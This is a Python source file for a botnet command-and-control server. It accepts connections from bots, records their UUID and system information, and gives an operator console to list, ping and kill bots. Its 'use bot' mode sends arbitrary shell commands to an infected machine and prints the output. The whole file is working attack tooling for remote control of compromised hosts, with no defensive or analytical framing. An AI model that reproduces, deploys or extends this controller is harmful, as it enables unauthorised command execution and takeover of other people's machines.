import socket
import subprocess
import sys
import os
import threading

ARG_LIST=sys.argv

SERVER_IP=""
SERVER_PORT=0
BUFFER=0
BOTS={}
BOTNOS=0
KILLTHREAD=False
def HELP():
	print("""
HELP MENU
~~~~ ~~~~
Syntax: botnet.py <args> 
Args:   -h -----------------------> Help
	-v -----------------------> Verbode Mode
	-H -----------------------> Set Host Addr, Addr:Port
	-B -----------------------> Set Buffer Value""")
	exit()    

	
try:
	ARG_LIST.index("-h")
	HELP()
	exit()
except:
	pass


try:
	IP_VAL=ARG_LIST[ARG_LIST.index("-H")+1]
	IP_VAL=IP_VAL.split(":")
	SERVER_IP=IP_VAL[0]
	SERVER_PORT=int(IP_VAL[1])
	BUFFER=int(ARG_LIST[ARG_LIST.index("-B")+1])
except:
	print("[SYSTEM] Invalid Arg Value")
	HELP()

try:
	ARG_LIST.index("-v")
	print("[SYSTEM] Verbose Mode Enabled")
	VERBOSE=True
except:
	VERBOSE=False

print("[SYSTEM] Starting Server...")

sock=socket.socket()
socket.setdefaulttimeout(10.0)
try:
	sock.bind((SERVER_IP,SERVER_PORT))
except Exception as Exec:
	print("[SYSTEM] Failed to start Server...")
	print("[SYSTEM] Invalid Host Address")
	if VERBOSE:
		print(f"[SYSTEM | DEBUG] {Exec}")
	HELP()
sock.listen(10)


def main():
	global BOTS,BOTNOS,KILLTHREAD
	while True:
		INPUT=""
		INPUT=input("NET >>")
		if INPUT=="show bots status":
			for i in range(BOTNOS):
				try:
					BOTSTEMP=BOTS[i+1]
					try:
						CLIENT_SOCK=BOTSTEMP[2]
						CLIENT_SOCK.send(str.encode("pingbot"))
						OUTPUT=CLIENT_SOCK.recv(BUFFER)
						OUTPUT=OUTPUT.decode()
						if OUTPUT=='pingbot':
							BOTSTEMP[1]="ONLINE"
						else:
							BOTSTEMP[1]="OFFLINE/SENT UNKNOWN RESPONSE"
					except:
						BOTSTEMP[1]="OFFINE"
					print("Bot Number: ",i+1,"Bot Status ",BOTSTEMP[1])
				except:
					pass
		elif INPUT=="show bots info":
			for i in range(BOTNOS):
				try:
					BOTSTEMP=BOTS[i+1]
					print("--------------------------------------------------------------------------------------")
					print("Bot Number: ",i+1,"Bot Info ",BOTSTEMP[0])
				except:
					pass
		elif INPUT[:8]=="kill bot":
			try:
				BOTNO=int(INPUT[8:])
				BOTSTEMP=BOTS[BOTNO]
				CLIENT_SOCK=BOTSTEMP[2]
				COMM_SEND="exit"
				CLIENT_SOCK.send(COMM_SEND.encode())
				CLIENT_SOCK.close()
				BOTS.pop(BOTNO)
				print("[SYSTEM | BOT Info] Killed bot ",BOTNO)
			except:
				print("[SYSTEM|| Kill Bot] Bot %s not found!"%BOTNO)
		elif INPUT[:7]=="use bot":
			try:
				BOTNO=int(INPUT[7:])
				BOTSTEMP=BOTS[BOTNO]
				print("[SYSTEM | BOT Info] Using bot ",BOTNO)
				CLIENT_SOCK,CLIENT_ADDR=BOTSTEMP[2],BOTSTEMP[3]
				while True:
					try:
						COMM_SEND=input()
						if COMM_SEND=="":
							print("[SYSTEM] Empty Request Detected!")
						else:
							if COMM_SEND=="background":
								print("[SYSTEM | BOT Info] Backgrounding bot ",BOTNO)
								break
							COMM_SEND=COMM_SEND.encode()
							CLIENT_SOCK.send(COMM_SEND)
							COMM_RECV=CLIENT_SOCK.recv(BUFFER)
							COMM_RECV=COMM_RECV.decode()
							print(COMM_RECV,end="")
							if COMM_RECV=="[Client] Self Destruct Initiated!":
								print("\n")
								break
					except Exception as Exec:
						print("[SYSTEM | CRITICAL] System sent Command but Client didn't send any response!")
						if VERBOSE:
							print(f"[SYSTEM | DEBUG] {Exec}")
			except:
				print("[SYSTEM | Use Bot] Bot %s not found!"%BOTNO)
		elif INPUT=="exit":
			KILLTHREAD=True
			break
		else:
			pass
	try:
		sock.close()
		exit()
	except:
		exit()
	
def BOTCONNECTOR():
	global BOTNOS,BOTS,KILLTHREAD
	while True: 
		try:    
			CLIENT_SOCK,CLIENT_ADDR=sock.accept()
			BOTNOS+=1
			print(f"\n[SERVER] Client {CLIENT_ADDR[0]}:{CLIENT_ADDR[1]} Connected")
			print(f"[SYSTEM] Waiting for Client Acknowledgement and sysinfo")
			print(f"CLIENT_SOCK: {CLIENT_SOCK}")
			ACK=CLIENT_SOCK.recv(BUFFER)
			ACK_RECV=ACK.decode()
			ACK_SEND="Received".encode()
			CLIENT_SOCK.send(ACK_SEND)
			print("[SYSTEM] Client Acknowledged!")
			print("[SYSTEM] Client ready to accept commands!")
			print("[CLIENT] UUID: ",ACK_RECV[6:42])
			BOTS[BOTNOS]=[ACK_RECV,"ONLINE",CLIENT_SOCK,CLIENT_ADDR]
			print(f"[CLIENT]Printing Sysinfo:\n {ACK_RECV}",end="")
			if KILLTHREAD:
				break
		except Exception as Exec:
			if KILLTHREAD:
				break
			print("[SYSTEM | CRITICAL] Client Acknowledgement Failed!")
			if VERBOSE:
				print(f"[SYSTEM | DEBUG] {Exec}")

print(f"[SERVER] Started listening on {SERVER_IP}:{SERVER_PORT}...")
THREAD=threading.Thread(target=BOTCONNECTOR)
THREAD.start()
main()
